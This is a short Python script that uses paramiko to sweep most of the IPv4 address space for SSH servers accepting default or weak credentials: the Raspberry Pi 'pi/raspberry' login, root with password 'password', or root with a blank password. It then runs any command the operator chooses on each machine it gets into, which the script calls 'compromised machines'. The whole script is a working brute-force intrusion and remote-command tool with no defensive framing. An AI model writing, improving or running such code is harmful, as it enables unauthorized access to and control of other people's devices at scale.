import paramiko
ssh = paramiko.SSHClient()
run = False
while(run == False):
	print("Menu")
	print("1. Search for raspis with default login")
	print("2. Search for any Linux machine with root password \"password\"")
	print("3. Search for any Linux machine with blank root password")
	selection = int(input(">"))
	if(selection == 1 or selection == 2 or selection == 3):
		command = input("Command to run on compromised machines: ")
		run = True
	else:
		print("Invalid selection!")
		
username = "root"
password = ""
if(selection == 1):
	password = "raspberry"
	username = "pi"
elif(selection == 2):
	password = "password"

for a in range(192):
	a = a + 1
	for b in range(256):
		for c in range(256):
			for d in range(256):
				ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
				print("TRY IP " + ip)
				try:
					ssh.connect(ip, username=username, password=password)
					ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
					print("IP " + str(ip) + " SUCCESS")
				except:
					print("IP " + str(ip) + " FAIL") 
